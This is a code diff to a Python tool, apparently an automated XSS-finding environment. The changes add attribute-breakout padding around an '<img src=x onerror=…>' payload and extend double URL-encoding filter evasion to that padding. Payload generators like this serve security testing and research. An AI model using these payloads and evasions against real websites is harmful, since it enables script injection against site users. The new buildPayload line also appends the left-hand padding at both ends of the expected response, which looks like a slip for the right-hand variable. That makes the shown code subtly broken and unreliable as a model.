@@ -2,8 +2,6 @@ from bs4 import BeautifulSoup
 import sys, random, string, requests, re
 import utils
 
-
-
 # To add a new action: 
 #  create a new method
 #  add it to the self.actions dictionary in the states where it is allowed
@@ -26,7 +24,8 @@ class Enviroment:
         # Initiliaze xss payload
         self.js = ""
         self.html = ""
-        self.html_padding=""
+        self.html_padding_sx=""
+        self.html_padding_dx=""
         self.padding_sx = ""
         self.padding_dx = ""
         self.payload = ""
@@ -35,6 +34,8 @@ class Enviroment:
         # Initiliaze xss trigger
         self.injection_point = ""
         self.expected_html = ""
+        self.expected_html_padding_sx = ""
+        self.expected_html_padding_dx = ""
         self.expected_js = ""
         self.expected = ""
 
@@ -155,8 +156,8 @@ class Enviroment:
 
     # Build XSS payload and expected response
     def buildPayload(self):
-        self.payload = self.padding_sx + str(self.html).replace("{}", self.js, 1) + self.padding_dx
-        self.expected = self.html_padding + str(self.expected_html).replace("{}", self.expected_js, 1)
+        self.payload = self.padding_sx + self.html_padding_sx + str(self.html).replace("{}", self.js, 1) + self.html_padding_dx + self.padding_dx
+        self.expected = self.expected_html_padding_sx + str(self.expected_html).replace("{}", self.expected_js, 1) + self.expected_html_padding_sx
 
     # Returns the tag into where the random string was injected
     def getInjectionPoint(self, response):
@@ -311,19 +312,32 @@ class Enviroment:
     # ACTIONS FIND VALID HTML
 
     def actionInjectionInTag(self):
+        # set default html payload
         htmlPayload = "<img src=x onerror={}>"
         self.html = htmlPayload
         self.expected_html = htmlPayload
 
     def actionInjectionInAttribute(self):
+        # find open tag
         tag = re.findall("<(\w*)",self.injection_point)
         if len(tag) > 0:
             tag = tag[0]
         else:
             tag = "p"
-        htmlPayload = "\"><img src=x onerror={}><"+tag+" "
+        
+        # set html padding
+        padding_sx = "\">"
+        padding_dx = "< {} ".format(tag)
+        self.html_padding_sx = padding_sx
+        self.html_padding_dx = padding_dx
+        self.expected_html_padding_sx = padding_sx
+        self.expected_html_padding_dx = padding_dx
+        
+        # set default html payload
+        htmlPayload = "<img src=x onerror={}>"
         self.html = htmlPayload
         self.expected_html = htmlPayload
+
 
     # ACTIONS AVOID HTML FILTERS
 
@@ -339,7 +353,11 @@ class Enviroment:
         doubleEncoding = {"<":"253C",">":"253E","/":"252F","\\":"255C","\"":"2522","'":"2527"}
         for key in singleEncoding:
             self.html = self.html.replace(key, "%"+doubleEncoding[key])
+            self.html_padding_sx = self.html_padding_sx.replace(key, "%"+doubleEncoding[key])
+            self.html_padding_dx = self.html_padding_dx.replace(key, "%"+doubleEncoding[key])
             self.expected_html = self.expected_html.replace(key, "%"+singleEncoding[key])
+            self.expected_html_padding_sx = self.expected_html_padding_sx.replace(key, "%"+singleEncoding[key])
+            self.expected_html_padding_dx = self.expected_html_padding_dx.replace(key, "%"+singleEncoding[key])
 
     # ACTIONS AVOID JS FILTERS
 
